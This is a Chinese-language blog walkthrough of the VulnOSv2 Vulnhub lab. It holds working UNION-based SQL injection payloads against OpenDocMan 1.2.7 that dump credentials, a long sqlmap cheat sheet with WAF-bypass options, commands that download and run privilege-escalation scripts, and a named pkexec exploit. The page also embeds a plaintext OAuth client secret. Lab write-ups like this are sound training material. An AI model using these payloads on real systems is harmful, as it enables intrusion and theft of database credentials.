@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-14VulnOSv2 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-14VulnOSv2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:05:42</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>VulnOSv2</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.111.133</span>     nmap --min-rate <span class="number">100000</span> -p22,<span class="number">80</span>,<span class="number">6667</span> -A <span class="number">192.168.111.133</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-14vulnosv2//image-20241115221122181.png" alt="image-20241115221122181"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.133</span>  dirb  http://<span class="number">192.168.111.133</span>/      nikto -host <span class="number">192.168.111.133</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p>常规扫描，目前没有任何有用信息，查看页面发现有Drupal 7</p>
+<p><img src="/vulnhub-14vulnosv2//image-20241115222841800.png" alt="image-20241115222841800"></p>
+<p>同时这里可能存在sql注入  	在页面里点点点，找到这个路径	&#x2F;jabcd0cs&#x2F;    这个是OpenDocMan–v1.2.7，想起了之前dirb扫到的一个目录是版本号</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.133/javascript/jquery/version">http://192.168.111.133/javascript/jquery/version</a>     进去之后只有这个版本号1.7.2  没事，跟这个没关系</p>
+<p><img src="/vulnhub-14vulnosv2//image-20241115224008532.png" alt="image-20241115224008532"></p>
+<p><img src="/vulnhub-14vulnosv2//image-20241115224834529.png" alt="image-20241115224834529"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">有nday，http:<span class="comment">//192.168.111.133/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9  查版本号</span></span><br><span class="line">&lt;<span class="number">1</span>&gt; 库名</span><br><span class="line">?q=<span class="number">1</span>&amp;add_value=odm_user UNION SELECT <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="number">2</span>&gt; 表名</span><br><span class="line">?q=<span class="number">1</span>&amp;add_value=odm_user UNION SELECT <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database()</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">3</span>&gt; 列名（后端做了过滤，可以用<span class="number">16</span>进制编码表示表名）</span><br><span class="line">?q=<span class="number">1</span>&amp;add_value=odm_user UNION SELECT <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x6f646d5f75736572</span> and table_schema=database()</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">4</span>&gt; 数据</span><br><span class="line">?q=<span class="number">1</span>&amp;add_value=odm_user UNION SELECT <span class="number">1</span>,group_concat(concat(username,<span class="number">0x5e</span>,password)),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="keyword">from</span> odm_user</span><br><span class="line"></span><br><span class="line">sqlmap：</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.133/jabcd0cs//ajax_udf.php?q=1&amp;add_value=odm_user&quot;</span>  --level=<span class="number">3</span> --risk=<span class="number">3</span> -D jabcd0cs -T odm_user -C username,password --dump --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.133/jabcd0cs//ajax_udf.php?q=1&amp;add_value=odm_user&quot;</span>  --level=<span class="number">3</span> --risk=<span class="number">3</span> --current-user --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.133/jabcd0cs//ajax_udf.php?q=1&amp;add_value=odm_user&quot;</span>  --level=<span class="number">3</span> --risk=<span class="number">3</span> --is-dba --batch</span><br><span class="line">##########################################################################################################################################</span><br><span class="line"></span><br><span class="line">sqlmap基本使用：</span><br><span class="line"><span class="number">1</span>、检测「注入点」sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span></span><br><span class="line"><span class="number">2</span>、查看所有「数据库」sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br><span class="line"><span class="number">3</span>、查看当前使用的数据库sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --current-db</span><br><span class="line"><span class="number">4</span>、查看「数据表」sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br><span class="line"><span class="number">5</span>、查看「字段」sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --tables</span><br><span class="line"><span class="number">6</span>、查看「数据」sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --dump</span><br><span class="line">一、目标</span><br><span class="line">检测「注入点」前，需要指定需要检测的「对象」。</span><br><span class="line"><span class="number">1</span>、指定url  -u 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。sqlmap -u <span class="string">&#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27;</span>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-14vulnosv2//99db1296c6f1ba11ece43312a58b9a74.png" alt="在这里插入图片描述"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">2</span>指定文件（批量检测）准备一个「文件」，写上需要检测的多个url，一行一个。 sqlmap -m urls.txt   逐个扫描url，需要确认就按y。 然后再按y扫描下一个url。</span><br><span class="line"><span class="number">3</span>、指定数据库/表/字段</span><br><span class="line">-D 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。</span><br><span class="line">-T 指定目标「表」，单/双引号包裹，常配合其他参数使用。</span><br><span class="line">-C 指定目标「字段」，单/双引号包裹，常配合其他参数使用。</span><br><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --dump --batch</span><br><span class="line"><span class="number">4</span>、post请求 检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。-r 指定需要检测的文件，SQLmap会通过post请求方式检测目标。 sqlmap -r bp.txt</span><br><span class="line"><span class="number">5</span>、cookie注入 --cookie 指定cookie的值，单/双引号包裹。 sqlmap -u <span class="string">&quot;http://xx?id=x&quot;</span> --cookie <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">二、脱库  获取所有内容 sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -a		a：all</span><br><span class="line"><span class="number">1</span>、获取数据库  --dbs 获取数据库		<span class="number">1.1</span>、获取数据库版本		sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -b</span><br><span class="line"><span class="number">2.1</span>、获取表，可以指定数据库  sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br><span class="line"><span class="number">2.2</span>、同时获取多个库的表名，库名用逗号分隔。  sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security,sys&#x27;</span> --tables</span><br><span class="line"><span class="number">2.3</span>、不指定数据库，默认获取数据库中所有的表。  sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tables</span><br><span class="line"><span class="number">3.1</span>、获取字段，可以指定库和表，sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --columns  最后面显示表（users）中的所有字段。</span><br><span class="line"><span class="number">3.2</span>、不指定表名，默认获取当前数据库中所有表的字段。  sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --columns</span><br><span class="line"><span class="number">4</span>、获取字段类型--schema ，可以指定库或指定表。不指定则获取数据库中所有字段的类型。sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --schema</span><br><span class="line"><span class="number">5</span>、获取值（数据--dump，可以指定具体的库、表、字段。qlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username,password&#x27;</span> --dump</span><br><span class="line">获取指定库中所有表的数据。 sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --dump</span><br><span class="line"><span class="number">6.1</span>、获取当前登录数据库的用户 sqlmap -u <span class="string">&#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27;</span> --current-user</span><br><span class="line">--users 获取数据库的所有用户名。 sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --users</span><br><span class="line">--passwords 获取数据库的所有用户名的密码（哈希）。 sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --passwords</span><br><span class="line">--privileges 查看每个数据库用户都有哪些权限。sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --privileges</span><br><span class="line">--is-dba 判断当前登录的用户是不是数据库的管理员账号。sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --is-dba</span><br><span class="line">--hostname 获取服务器主机名。sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --hostname</span><br><span class="line"><span class="number">8</span>、搜索库、表、字段。--search 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。搜索数据库中有没有 security 这个数据库：</span><br><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --search|||sqlmap -u <span class="string">&#x27;http://xxx/?id=1&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --search||sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --search</span><br><span class="line"><span class="number">9</span>、正在执行的SQL语句--statements 获取数据库中正在执行的SQL语句。sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --statements</span><br><span class="line">三、WAF绕过--tamper 指定绕过脚本，绕过WAF或ids等。 sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tamper <span class="string">&#x27;space2comment.py&#x27;</span></span><br><span class="line">SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下</span><br><span class="line">三、其他</span><br><span class="line">--batch （默认确认）不再询问是否确认。</span><br><span class="line">--method=GET 指定请求方式（GET/POST）</span><br><span class="line">--random-agent 随机切换UA（User-Agent）</span><br><span class="line">--user-agent <span class="string">&#x27; &#x27;</span> 使用自定义的UA（User-Agent）</span><br><span class="line">--referer <span class="string">&#x27; &#x27;</span> 使用自定义的 referer</span><br><span class="line">--proxy=<span class="string">&quot;127.0.0.1:8080&quot;</span> 指定代理</span><br><span class="line">--threads <span class="number">10</span> 设置线程数，最高<span class="number">10</span></span><br><span class="line">--level=<span class="number">1</span> 执行测试的等级（<span class="number">1</span><span class="number">-5</span>，默认为<span class="number">1</span>，常用<span class="number">3</span>）</span><br><span class="line">--risk=<span class="number">1</span> 风险级别（<span class="number">0</span>~<span class="number">3</span>，默认<span class="number">1</span>，常用<span class="number">1</span>），级别提高会增加数据被篡改的风险。</span><br><span class="line">##########################################################################################################################################</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-14vulnosv2//image-20241115225243526.png" alt="image-20241115225243526"></p>
+<p>这有两个用户被查出来  webmin和guest，解一下md5  webmin^b78aae356709f8c31118ea613980954b,guest^084e0343a0486ff05530df6c705c8bb4</p>
+<p>得到两组ssh的登录账号webmin：webmin1980；guest：guest</p>
+<p>开始提权</p>
+<ul>
+<li><pre><code>### Kali Linux 中常见的提权工具和脚本：
+
+1. **LinPEAS**:
+
+   - **LinPEAS** 是一个常用的 Linux 提权枚举脚本，它会帮助你发现目标系统中的潜在提权路径。它会扫描系统配置文件、权限、SUID 文件、服务、环境变量等，查找可能的漏洞或不当配置。
+
+   - 使用方法：
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bash wget https://github.com/carlospolop/PEASS-ng/releases/download/20201027/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+
+2. **LinEnum**:
+
+   - **LinEnum** 是另一个流行的 Linux 提权工具，用来自动化收集系统信息。它可以帮助你分析目标机器并提供详细的提权建议。
+
+   - 使用方法：
+
+     <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash wget https://raw.githubusercontent.<span class="keyword">com</span>/rebootuser/LinEnum/master/LinEnum.<span class="keyword">sh</span></span><br><span class="line">chmod +<span class="keyword">x</span> LinEnum.<span class="keyword">sh</span></span><br><span class="line">./LinEnum.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+
+3. **GTFOBins**:
+
+   - **GTFOBins** 是一个由社区维护的项目，包含了各种 Linux 二进制文件和命令，这些命令可以被用来绕过权限限制或提升权限。它列出了许多常见的二进制文件及其潜在的提权用途，比如利用某些命令作为特权提权的入口。
+   - 官网：https://gtfobins.github.io/
+
+4. **The 5th Operating System (5OS)**:
+
+   - 这是一个专注于 Linux 提权的项目，旨在自动化提权过程。它会分析目标系统的配置并找出潜在的提权漏洞。
+
+5. **Linux Exploit Suggester (linux-exploit-suggester)**:
+
+   - **Linux Exploit Suggester** 是一个根据系统版本及内核信息建议潜在漏洞的脚本。它会根据目标系统的内核版本等信息，提供适合的漏洞利用建议。
+
+   - 使用方法：
+
+     <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bashCopy Codewget https://raw.githubusercontent.<span class="keyword">com</span>/jondonas/linux-exploit-suggester/master/linux-exploit-suggester.<span class="keyword">sh</span></span><br><span class="line">chmod +<span class="keyword">x</span> linux-exploit-suggester.<span class="keyword">sh</span></span><br><span class="line">./linux-exploit-suggester.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+
+6. **PSpy**:
+
+   - **PSpy** 是一个用来查看 Linux 系统中正在运行的进程及其活动的脚本。通过分析正在运行的进程，攻击者可以发现未授权的进程、敏感文件或容易利用的漏洞。
+
+   - 使用方法：
+
+     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bashCopy Codewget https://github.com/Arvanaghi/pspy/releases/download/1.3.0/pspy_amd64</span><br><span class="line"><span class="built_in">chmod</span> +x pspy_amd64</span><br><span class="line">./pspy_amd64</span><br></pre></td></tr></table></figure>
+
+### 提权的常见方法：
+
+- **SUID/SGID 程序**：某些具有 SUID 权限的程序（如 `/usr/bin/passwd`）可能允许普通用户通过执行这些程序来提升权限。
+- **内核漏洞**：内核漏洞（例如 dirty cow 漏洞）也常常成为提权的目标。
+- **配置错误**：如权限设置不当、配置文件暴露敏感信息等。
+- **不安全的服务配置**：例如不正确配置的 `sudo`、`cron` 服务等。
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在这里，我用<span class="strong">**blasty-vs-pkexec.c**</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+`blasty-vs-pkexec.c` 是一个利用 `pkexec` 漏洞的提权工具。`pkexec` 是一个用于允许普通用户执行特权命令的工具，通常作为 `polkit`（PolicyKit）的一部分存在。这个漏洞发生在 `pkexec` 中，允许攻击者绕过安全检查，提升权限到 `root`。该工具通常被用于渗透测试中，利用这一漏洞进行提权。
+
+
+![image-20241116011111098](/vulnhub-14vulnosv2/image-20241116011111098.png)
+</code></pre>
+</li>
+</ul>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-15raven2/">Vulnhub-15Raven2</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-13sickos1-2/">Vulnhub-13SickOs1.2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
